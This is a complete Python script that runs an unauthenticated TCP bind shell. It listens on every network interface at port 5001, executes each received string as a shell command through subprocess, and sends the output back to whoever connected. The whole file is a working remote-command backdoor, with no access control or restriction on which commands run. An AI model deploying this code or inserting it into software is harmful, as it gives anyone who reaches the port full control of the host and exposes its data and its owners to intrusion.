#!/usr/bin/env python3
import socket
import subprocess

def Main():
    host = '0.0.0.0'
    port = 5001

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))

    print("Server Started.")

    s.listen(1)
    c, addr = s.accept()
    print("Connection from:", addr)

    while True:
        data = c.recv(1024)  # Removed 'addr' as recvfrom is unnecessary for TCP
        if not data:
            break
        data_str = data.decode().strip()  # Decode bytes to string
        print("Message from:", addr)
        print("From connected user:", data_str)

        status, output = subprocess.getstatusoutput(data_str)
        print("Sending:", output)

        c.sendall(output.encode())  # Send back the response

    c.close()

if __name__ == "__main__":
    Main()